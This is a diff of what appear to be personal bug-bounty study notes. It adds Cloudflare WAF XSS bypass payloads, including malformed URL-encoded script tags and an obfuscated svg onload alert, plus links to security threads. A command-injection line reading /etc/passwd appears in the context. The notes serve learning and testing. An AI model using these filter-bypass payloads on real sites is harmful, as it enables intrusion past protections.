@@ -170,3 +170,20 @@ cat$IFS/etc/passwd
 
 ## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 77
 - [AWS Cloud Security](https://twitter.com/harshbothra_/status/1372607627297878016?s=20)
+
+
+# 📅 20-Mar-2021
+## Cloudflare XSS Bypass
+1. Bypass cloudflare with incorrect url encoding
+`<script>alert()</script>` blocked `%2sscript%2ualert()%2s/script%2u` -xss popup
+2. XSS Popup
+```js
+<svg onload=alert%26%230000000040"1")>
+```
+
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 79
+- [File Inclusion All-in-One](https://twitter.com/harshbothra_/status/1373262156121088000?s=20)
+
+# 📅 22-Mar-2021
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 80
+- [DockerENT Framework Insights](https://twitter.com/harshbothra_/status/1373658033943769095?s=20)
